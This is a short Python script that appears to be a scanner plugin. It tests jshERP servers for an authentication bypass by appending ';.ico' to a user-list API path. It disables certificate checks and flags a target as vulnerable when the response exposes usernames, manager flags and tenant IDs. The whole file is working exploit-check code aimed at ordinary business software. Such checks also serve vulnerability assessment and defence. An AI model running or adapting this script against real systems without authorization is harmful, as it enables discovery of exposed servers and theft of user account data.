import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"/jshERP-boot/user/getAllList;.ico"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	print(url)
	if response.status_code == 200 and re.search("\"username\":(.*?)",response.text) and re.search("\"ismanager\":(.*?)",response.text) and re.search("\"tenantId\":(.*?)",response.text):

		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False